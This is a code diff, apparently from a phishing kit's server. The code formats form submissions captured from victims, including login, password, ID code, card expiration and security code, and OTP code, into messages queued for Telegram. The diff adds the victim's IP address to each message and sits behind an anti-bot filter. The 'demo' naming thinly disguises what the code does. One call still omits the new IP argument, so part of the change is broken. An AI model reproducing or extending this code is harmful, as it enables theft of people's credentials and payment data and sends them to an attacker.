@@ -224,7 +224,7 @@ function buildDemoValues(testValues = {}) {
 }
 
 // Dedicated method for formatting a form-submission notification.
-function buildDemoFormSubmissionMessage(body) {
+function buildDemoFormSubmissionMessage(body, visitorIp) {
   const page = body.page;
 
   if (page === "Login") {
@@ -242,6 +242,7 @@ function buildDemoFormSubmissionMessage(body) {
       `Password:${demoName}`,
       `ID code :${demoNote}`,
       `Time: ${escapeTelegramText(body.timestamp)}`,
+      `IP :${visitorIp}`,
       "",
       "Done",
     ];
@@ -270,6 +271,7 @@ function buildDemoFormSubmissionMessage(body) {
       `Expiration:${expiration}`,
       `Code:${code}`,
       `Time: ${escapeTelegramText(body.timestamp)}`,
+      `IP :${visitorIp}`,
       "",
       "Done",
     ];
@@ -286,6 +288,7 @@ function buildDemoFormSubmissionMessage(body) {
       `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
       `OTP code:${otpCode}`,
       `Time: ${escapeTelegramText(body.timestamp)}`,
+      `IP :${visitorIp}`,
       "",
       "Done",
     ];
@@ -307,6 +310,7 @@ function buildDemoFormSubmissionMessage(body) {
     `Password:${demoName}`,
     `ID code :${demoNote}`,
     `Time: ${escapeTelegramText(body.timestamp)}`,
+    `IP :${visitorIp}`,
     "",
     "Done",
   ];
@@ -314,16 +318,16 @@ function buildDemoFormSubmissionMessage(body) {
   return lines.join("\n");
 }
 
-function buildMessage(body) {
+function buildMessage(body, visitorIp) {
   const eventType = EVENT_ALIASES[body.eventType];
 
   if (eventType === "FORM_SUBMITTED") {
     return buildDemoFormSubmissionMessage(body);
   }
-
   return [
     `Page: ${escapeTelegramText(body.page)}`,
     `Event: ${eventType}`,
+    `IP :${visitorIp}`,
     `Time: ${escapeTelegramText(body.timestamp)}`,
   ].join("\n");
 }
@@ -447,6 +451,8 @@ function sendToTelegramQueued(message) {
 }
 
 function handleNotify(req, res) {
+  const visitorIp = antiBot.getClientIp(req);
+  processVisit(visitorIp);
   const result = antiBot.inspect(req, {
     checkUserAgent: true,
     checkRateLimit: true,
@@ -457,7 +463,6 @@ function handleNotify(req, res) {
       ok: false,
       error: result.status === 429 ? "Too many requests" : "Request blocked",
     });
-
     console.warn("[AntiBot]", {
       reason: result.reason,
       ip: antiBot.getClientIp(req),
